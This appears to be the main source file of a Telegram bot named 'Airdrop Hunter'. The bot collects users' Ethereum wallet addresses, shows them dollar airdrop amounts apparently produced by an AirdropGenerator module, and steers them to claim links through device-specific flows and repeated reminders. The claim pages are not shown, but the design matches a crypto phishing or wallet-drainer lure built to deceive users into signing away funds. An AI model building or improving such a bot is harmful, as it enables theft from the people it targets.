const { Telegraf } = require('telegraf');
const MessageHandlers = require('./handlers/messageHandlers');
const DeviceDetectionService = require('./services/deviceDetectionService');
const NotificationService = require('./services/notificationService');
const UserService = require('./services/userService');
const ReminderService = require('./services/reminderService');
const InfuraService = require('./services/infuraService');
const FallbackService = require('./services/fallbackService');
const AirdropGenerator = require('./utils/airdropGenerator');
const WalletValidator = require('./utils/walletValidator');
const config = require('./config/config');

/**
 * Production-ready bot for Render deployment with 409 conflict resolution
 */
async function startProductionBot() {
    console.log('🚀 Starting Airdrop Hunter Bot on Render...');
    
    const botToken = process.env.BOT_TOKEN;
    if (!botToken) {
        console.error('❌ BOT_TOKEN not found in environment variables');
        process.exit(1);
    }
    
    const bot = new Telegraf(botToken);
    
    // CRITICAL: Clear conflicts before starting
    await clearBotConflicts(bot);
    
    // Initialize services
    const messageHandlers = new MessageHandlers();
    const deviceDetectionService = new DeviceDetectionService();
    const notificationService = new NotificationService();
    const userService = new UserService();
    
    // Initialize database
    console.log('📊 Initializing database...');
    await userService.initDatabase();
    
    // Initialize reminder service
    console.log('📅 Starting reminder service...');
    const reminderService = new ReminderService(bot, userService);
    reminderService.start();
    
    // Session storage for user states
    const sessions = new Map();
    
    // Middleware for session management
    bot.use((ctx, next) => {
        const userId = ctx.from?.id;
        if (!userId) return next();
        
        if (!sessions.has(userId)) {
            sessions.set(userId, { 
                state: 'idle',
                walletAddress: null,
                airdropData: null 
            });
        }
        ctx.session = sessions.get(userId);
        return next();
    });
    
    // Bot command handlers
    bot.start(async (ctx) => {
        await userService.upsertUser({
            id: ctx.from.id,
            username: ctx.from.username,
            firstName: ctx.from.first_name,
            lastName: ctx.from.last_name
        });
        await messageHandlers.handleStartCommand(ctx);
    });
    
    bot.help((ctx) => messageHandlers.handleHelpRequest(ctx));
    
    // Handle wallet address input
    bot.on('text', async (ctx) => {
        const text = ctx.message.text;
        
        if (text.startsWith('/')) return;
        
        if (ctx.session.state === 'awaiting_wallet' || ctx.session.state === 'waiting_wallet') {
            await messageHandlers.handleWalletAddress(ctx, text);
        } else {
            await messageHandlers.handleUnknownCommand(ctx, text);
        }
    });
    
    // Handle callback queries (button presses)
    bot.on('callback_query', async (ctx) => {
        const data = ctx.callbackQuery.data;
        
        try {
            if (data === 'analyze_wallet') {
                ctx.session.state = 'awaiting_wallet';
                await ctx.editMessageText(
                    '💳 *Enter Wallet Address*\n\nPlease send your Ethereum wallet address or ENS domain:\n\n📝 Examples:\n• `0x1234...5678`\n• `vitalik.eth`',
                    { parse_mode: 'Markdown' }
                );
                
            } else if (data === 'help_support') {
                await messageHandlers.handleHelpRequest(ctx);
                
            } else if (data === 'contact_admin') {
                const contactMessage = `📞 *Contact Support*\n\nReach out to our admin team:\n\n👤 Telegram: @${config.ADMIN_USERNAME}\n📧 Email: ${config.ADMIN_EMAIL}\n\n⏱️ *Response Time:* Usually within 24 hours\n\n💡 Please describe your issue in detail for faster assistance.`;
                
                const keyboard = {
                    inline_keyboard: [
                        [{ text: '💬 Message Admin', url: `https://t.me/${config.ADMIN_USERNAME}` }],
                        [{ text: '🔙 Back to Menu', callback_data: 'back_to_menu' }]
                    ]
                };
                
                try {
                    await ctx.editMessageText(contactMessage, {
                        parse_mode: 'Markdown',
                        reply_markup: keyboard
                    });
                } catch (error) {
                    await ctx.reply(contactMessage, {
                        parse_mode: 'Markdown',
                        reply_markup: keyboard
                    });
                }
                
            } else if (data === 'back_to_menu') {
                await ctx.editMessageText(
                    '🌟 *Welcome to Airdrop Hunter!*\n\nDiscover hidden crypto opportunities by analyzing your wallet across multiple blockchain networks.\n\n🔍 Get started by analyzing your wallet address!',
                    {
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔍 Analyze Wallet', callback_data: 'analyze_wallet' }],
                                [{ text: '❓ Help & Support', callback_data: 'help_support' }]
                            ]
                        }
                    }
                );
                
            } else if (data === 'claim_airdrop') {
                if (!ctx.session.airdropData) {
                    // Try to recover from database
                    const userData = await userService.getUserWithAirdropData(ctx.from.id);
                    if (userData && userData.pending_airdrop_amount) {
                        ctx.session.airdropData = {
                            amount: userData.pending_airdrop_amount,
                            projects: userData.pending_airdrop_projects ? userData.pending_airdrop_projects.split(',') : ['DeFi Project'],
                            claimUrl: userData.pending_airdrop_claim_url,
                            template: {
                                name: userData.pending_airdrop_projects || 'DeFi Project',
                                id: 'recovered_claim'
                            },
                            id: 'recovered_claim'
                        };
                        ctx.session.walletAddress = userData.last_wallet_address;
                    }
                }
                
                if (ctx.session.airdropData) {
                    if (config.USE_DEVICE_SELECTION) {
                        await deviceDetectionService.showDeviceSelection(ctx, ctx.session.airdropData);
                    } else {
                        // Use all-in-one URL approach
                        const keyboard = require('./keyboards/inlineKeyboards').claimKeyboard(ctx.session.airdropData);
                        await ctx.editMessageText(
                            `🎉 *Ready to Claim!*\n\n💰 Amount: $${ctx.session.airdropData.amount.toLocaleString()}\n🎯 Project: ${ctx.session.airdropData.template.name}\n\n✨ Click below to claim your airdrop!`,
                            {
                                parse_mode: 'Markdown',
                                reply_markup: keyboard
                            }
                        );
                    }
                } else {
                    await ctx.editMessageText('❌ No airdrop data available. Please analyze your wallet first.');
                }
                
            } else if (data.startsWith('device_')) {
                const parts = data.split('_');
                const device = parts[1];
                const claimId = parts[2];
                await deviceDetectionService.handleDeviceSelection(ctx, device, claimId);
                
            } else if (data === 'mobile_to_desktop') {
                await deviceDetectionService.showDesktopSelection(ctx, ctx.session.airdropData);
                
            } else if (data === 'desktop_claim_flow') {
                await deviceDetectionService.showDesktopSelection(ctx, ctx.session.airdropData);
                
            } else if (data === 'stop_reminders') {
                await reminderService.handleStopReminders(ctx);
                
            } else if (data === 'back_to_main') {
                ctx.session.state = 'idle';
                await messageHandlers.handleStartCommand(ctx);
                
            } else if (data.startsWith('reminder_')) {
                // Handle reminder-related callbacks
                const action = data.replace('reminder_', '');
                if (action === 'snooze') {
                    await ctx.editMessageText('⏰ Reminder snoozed for 1 hour. We\'ll remind you later!');
                } else if (action === 'stop') {
                    await reminderService.handleStopReminders(ctx);
                }
            }
            
            await ctx.answerCbQuery();
            
        } catch (error) {
            console.error('Callback query error:', error);
            await ctx.answerCbQuery('An error occurred. Please try again.');
        }
    });
    
    // ENHANCED: Global error handler with conflict resolution
    bot.catch((err, ctx) => {
        console.error('Bot error:', err);
        
        if (err.code === 409) {
            console.log('🚨 409 Conflict detected - restarting service in 5 seconds...');
            setTimeout(() => {
                console.log('♻️ Exiting for Render auto-restart...');
                process.exit(1);
            }, 5000);
            return;
        }
        
        if (err.code === 429) {
            console.log('⚠️ Rate limit hit - continuing with delay...');
            return;
        }
        
        if (ctx) {
            ctx.reply('❌ An error occurred. Please try again.').catch(() => {
                console.log('Failed to send error message to user');
            });
        }
    });
    
    // Start bot with enhanced polling configuration
    console.log('🔄 Starting bot with polling...');
    await bot.launch({
        polling: {
            timeout: 30,
            limit: 100,
            allowedUpdates: ['message', 'callback_query'],
            dropPendingUpdates: true
        }
    });
    
    console.log('✅ Bot launched successfully on Render!');
    
    // Health check server for Render
    const http = require('http');
    const server = http.createServer((req, res) => {
        if (req.url === '/health') {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ 
                status: 'healthy', 
                uptime: process.uptime(),
                timestamp: new Date().toISOString()
            }));
        } else {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('Airdrop Hunter Bot is running');
        }
    });
    
    const port = process.env.PORT || 8000;
    server.listen(port, () => {
        console.log(`🌐 Health check server running on port ${port}`);
    });
    
    // Graceful shutdown with cleanup
    const gracefulShutdown = (signal) => {
        console.log(`📤 Received ${signal}, shutting down gracefully...`);
        
        reminderService.stop();
        
        bot.stop(signal).then(() => {
            console.log('🤖 Bot stopped successfully');
            
            server.close(() => {
                console.log('🌐 Health server closed');
                process.exit(0);
            });
        }).catch((error) => {
            console.error('Error stopping bot:', error);
            process.exit(1);
        });
        
        // Force exit after 30 seconds
        setTimeout(() => {
            console.log('⏰ Force exit after timeout');
            process.exit(1);
        }, 30000);
    };
    
    process.once('SIGINT', () => gracefulShutdown('SIGINT'));
    process.once('SIGTERM', () => gracefulShutdown('SIGTERM'));
    
    // Enhanced error handling for production
    process.on('unhandledRejection', (reason, promise) => {
        console.error('🚨 Unhandled Rejection at:', promise, 'reason:', reason);
        
        if (reason?.code === 409) {
            console.log('♻️ Restarting due to unhandled 409 conflict...');
            process.exit(1);
        }
    });
    
    process.on('uncaughtException', (error) => {
        console.error('🚨 Uncaught Exception:', error);
        
        if (error?.code === 409) {
            console.log('♻️ Restarting due to uncaught 409 conflict...');
            process.exit(1);
        }
        
        // For other errors, try to continue
        console.log('⚠️ Attempting to continue after uncaught exception...');
    });
    
    // Periodic health check
    setInterval(() => {
        const memUsage = process.memoryUsage();
        const uptime = process.uptime();
        
        console.log(`💓 Health check - Uptime: ${Math.floor(uptime/60)}m, Memory: ${Math.round(memUsage.heapUsed/1024/1024)}MB`);
        
        // Restart if memory usage is too high (>500MB)
        if (memUsage.heapUsed > 500 * 1024 * 1024) {
            console.log('🚨 High memory usage detected - restarting...');
            process.exit(1);
        }
    }, 10 * 60 * 1000); // Every 10 minutes
}

/**
 * Clear bot conflicts before starting
 * @param {Telegraf} bot - Bot instance
 */
async function clearBotConflicts(bot) {
    console.log('🧹 Clearing potential bot conflicts...');
    
    try {
        // Clear webhook with all pending updates
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        console.log('✅ Webhook cleared successfully');
        
        // Clear pending updates
        await bot.telegram.getUpdates({ offset: -1, limit: 1 });
        console.log('✅ Pending updates cleared');
        
        // Verify bot connection
        const botInfo = await bot.telegram.getMe();
        console.log(`✅ Bot verified: @${botInfo.username} (${botInfo.first_name})`);
        
        // Wait a moment for everything to settle
        await new Promise(resolve => setTimeout(resolve, 2000));
        console.log('✅ Conflict resolution completed');
        
    } catch (error) {
        console.error('⚠️ Conflict clearing error:', error.message);
        
        if (error.code === 409) {
            console.log('🚨 Still detecting conflicts - waiting 30 seconds before retry...');
            await new Promise(resolve => setTimeout(resolve, 30000));
            
            try {
                await bot.telegram.deleteWebhook({ drop_pending_updates: true });
                console.log('✅ Conflict cleared on retry');
            } catch (retryError) {
                console.error('❌ Failed to clear conflicts on retry:', retryError.message);
                process.exit(1);
            }
        }
    }
}

// Start the production bot
startProductionBot().catch(error => {
    console.error('🚨 Failed to start bot:', error);
    
    if (error.code === 409) {
        console.log('♻️ Exiting due to 409 conflict - Render will restart automatically');
    }
    
    process.exit(1);
});